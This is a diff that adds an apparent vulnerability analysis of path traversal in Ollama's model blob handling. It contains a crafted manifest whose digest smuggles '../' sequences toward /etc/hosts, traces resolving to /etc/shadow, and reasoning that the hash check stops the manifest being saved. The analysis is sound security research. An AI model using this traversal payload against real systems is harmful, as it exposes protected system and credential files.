@@ -1,0 +1,38 @@
+Malicious manifest JSON:
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+  "config": {
+    "mediaType": "application/vnd.ollama.image.config",
+    "digest": "sha256:../../../../../../../etc/hosts",
+    "size": 100
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.ollama.image.tensor",
+      "digest": "sha256:0000000000000000000000000000000000000000000000000000000000000001",
+      "size": 10
+    }
+  ]
+}
+
+--- Sink trace ---
+upload.go:181: os.Open(filepath.Join(srcDir, digestToPath(blob.Digest)))
+  srcDir=/Users/u/.ollama/models/blobs, depth=3 -> /Users/u/.ollama/models/etc/shadow
+  srcDir=/Users/u/.ollama/models/blobs, depth=4 -> /Users/u/.ollama/etc/shadow
+  srcDir=/Users/u/.ollama/models/blobs, depth=5 -> /Users/u/etc/shadow
+  srcDir=/Users/u/.ollama/models/blobs, depth=6 -> /Users/etc/shadow
+  srcDir=/Users/u/.ollama/models/blobs, depth=7 -> /etc/shadow
+  srcDir=/var/lib/ollama/models/blobs, depth=3 -> /var/lib/ollama/models/etc/shadow
+  srcDir=/var/lib/ollama/models/blobs, depth=4 -> /var/lib/ollama/etc/shadow
+  srcDir=/var/lib/ollama/models/blobs, depth=5 -> /var/lib/etc/shadow
+  srcDir=/var/lib/ollama/models/blobs, depth=6 -> /var/etc/shadow
+  srcDir=/var/lib/ollama/models/blobs, depth=7 -> /etc/shadow
+
+--- save() hash verification ---
+download.go:257: if got := fmt.Sprintf("sha256:%x", h.Sum(nil)); got != blob.Digest
+For blob.Digest='sha256:../../../etc/shadow':
+  even for trivial content, got='sha256:6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d' which is hex (64 bytes), cannot equal traversal string
+  -> hash mismatch -> os.Remove(tmp) -> error returned from save
+  -> pullWithTransfer returns BEFORE os.WriteFile(fp, manifestData, ...)
+  -> malicious manifest is NOT persisted
